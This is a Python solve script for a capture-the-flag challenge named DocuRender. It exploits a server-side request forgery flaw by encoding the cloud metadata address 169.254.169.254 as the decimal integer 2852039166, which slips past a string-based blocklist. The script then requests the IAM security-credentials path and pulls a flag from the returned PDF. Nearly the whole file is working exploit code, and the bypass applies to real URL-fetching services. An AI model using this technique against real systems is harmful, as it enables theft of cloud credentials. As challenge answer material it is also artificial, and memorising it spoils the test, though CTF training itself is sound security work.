#!/usr/bin/env python3
"""
Official solve script for DocuRender (SSRF).

The renderer blocks the literal strings "169.254.169.254", "localhost",
"127.0.0.1", etc. from appearing in the hostname - but it never checks
what IP address the hostname actually resolves to. Any alternate numeric
representation of 169.254.169.254 that doesn't contain that exact
substring sails straight through.

169.254.169.254 as a 32-bit integer:
    169*256^3 + 254*256^2 + 169*256 + 254 = 2852039166

Usage:
    pip install -r requirements.txt
    python3 solve.py [http://TARGET_HOST:5000]
"""
import re
import sys
import requests

DEFAULT_TARGET = "http://localhost:5000"
METADATA_PATH = "/latest/meta-data/iam/security-credentials/internal-service-role"

# Decimal-integer encoding of 169.254.169.254
BYPASS_HOST = "2852039166"


def solve(target: str) -> str | None:
    render_url = f"{target}/render"
    payload_url = f"http://{BYPASS_HOST}{METADATA_PATH}"

    print(f"[*] POSTing to {render_url}")
    print(f"[*] Requesting internal URL via decimal-IP bypass: {payload_url}")

    resp = requests.post(render_url, data={"url": payload_url}, timeout=10)
    if resp.status_code != 200:
        print(f"[-] Renderer returned HTTP {resp.status_code}: {resp.text}")
        return None

    with open("loot.pdf", "wb") as f:
        f.write(resp.content)
    print("[+] Saved raw response to loot.pdf")

    try:
        from pypdf import PdfReader
        text = PdfReader("loot.pdf").pages[0].extract_text()
    except ImportError:
        print("[-] pip install -r requirements.txt (or pip install pypdf) to auto-extract text; loot.pdf saved for manual inspection.")
        return None

    # PDF line-wrapping can inject a stray newline mid-word, so search on a
    # flattened copy rather than relying on whitespace-delimited tokens.
    flattened = text.replace("\n", "")
    match = re.search(r"flag\{[^}]*\}", flattened)
    if match:
        flag = match.group(0)
        print(f"[+] FLAG: {flag}")
        return flag

    print("[-] Fetched the metadata response but couldn't find a flag{...} pattern.")
    print(text)
    return None


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET
    solve(target)
